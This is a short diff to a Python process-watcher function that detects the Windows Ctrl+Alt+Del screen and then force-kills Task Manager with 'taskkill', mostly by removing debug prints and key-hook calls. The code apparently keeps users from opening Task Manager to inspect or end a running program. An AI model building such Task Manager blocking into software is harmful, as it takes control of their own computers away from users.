@@ -55,22 +55,13 @@ def better_listener():
     while True:
         new_process = creation_watcher()
         old_process = deletion_watcher()
-        print(new_process.Caption)
-        print('del: ' + old_process.Caption)
         if new_process.Caption == 'LogonUI.exe':
             t.resume()
-            key_hook(False)
-            key_hook(True)
-            # deletion watcher doesn't seem to always return the same result when closing
-            # the ctrl+alt+del window, so used the list of ones it does return
             while True:
                 old_process = deletion_watcher()
                 new_process = creation_watcher()
-                print(new_process.Caption)
-                print('del: ' + old_process.Caption)
+
                 if old_process.Caption == 'LogonUI.exe' or new_process.Caption == 'Taskmgr.exe':
                     break
-                print('looped')
             os.system('taskkill /im Taskmgr.exe')
-            print('while skip')
             t.pause()
